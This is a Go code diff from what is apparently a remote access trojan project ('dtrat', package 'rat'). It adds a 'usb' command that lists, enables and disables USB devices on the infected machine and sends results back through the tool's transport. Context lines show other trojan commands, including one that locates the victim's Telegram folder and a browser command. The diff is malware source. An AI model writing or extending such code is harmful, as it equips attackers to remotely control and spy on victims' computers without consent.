@@ -2,8 +2,11 @@ package rat
 
 import (
 	"dtrat/config"
+	"dtrat/engine/system/usbwin"
 	"dtrat/transport"
+	"fmt"
 	"os"
+	"strings"
 )
 
 func errToStatus(err error) string {
@@ -33,6 +36,8 @@ func (r *Rat) commandsSwitch(text string) {
 		go r.browserCmd(args)
 	case "findtg":
 		go r.findTgCmd()
+	case "usb":
+		go r.usbCmd(args)
 	default:
 		go r.defaultCmd()
 	}
@@ -152,4 +157,79 @@ func (r *Rat) findTgCmd() {
 	}
 
 	r.Transport.Send("Папка Telegram найдена: %s", path)
+}
+
+func (r *Rat) usbDevicesListFmt(devices []usbwin.USBDevice) string {
+	if len(devices) == 0 {
+		return "USB устройства не найдены."
+	}
+
+	var bl strings.Builder
+
+	bl.Grow(len(devices) * 150)
+
+	for i, dev := range devices {
+		status := "🟢 Активно"
+		if !dev.IsActive {
+			status = "🔴 Отключено"
+		}
+
+		fmt.Fprintf(&bl, "[%d] Имя: %s\n"+
+			"    VID: %s | PID: %s\n"+
+			"    ID: %s\n"+
+			"    Статус: %s\n",
+			i+1, dev.Name, dev.VendorID, dev.ProductID, dev.DeviceID, status)
+	}
+
+	return strings.TrimRight(bl.String(), "\n")
+}
+
+func (r *Rat) usbListCmd() {
+	devices, err := r.Engine.System.GetUSBDevices()
+	if err != nil {
+		r.Transport.Send("Ошибка: %v", err)
+		return
+	}
+	lst := r.usbDevicesListFmt(devices)
+
+	r.Transport.Send("%s", lst)
+}
+
+func (r *Rat) usbEnableCmd(args string) {
+	err := r.Engine.System.SetUSBDeviceState(args, true)
+	if err != nil {
+		r.Transport.Send("Ошибка: %v", err)
+		return
+	}
+
+	r.Transport.Send("USB устройство %s включено.", args)
+}
+
+func (r *Rat) usbDisableCmd(args string) {
+	err := r.Engine.System.SetUSBDeviceState(args, false)
+	if err != nil {
+		r.Transport.Send("Ошибка: %v", err)
+		return
+	}
+
+	r.Transport.Send("USB устройство %s отключено.", args)
+}
+
+func (r *Rat) usbCmd(args string) {
+	cmd, arg := transport.ParseCommand(args)
+
+	switch cmd {
+	case "list":
+		go r.usbListCmd()
+		return
+	case "enable":
+		go r.usbEnableCmd(arg)
+		return
+	case "disable":
+		go r.usbDisableCmd(arg)
+		return
+	default:
+		r.Transport.Send("Неизвестное действие: %s", cmd)
+		return
+	}
 }
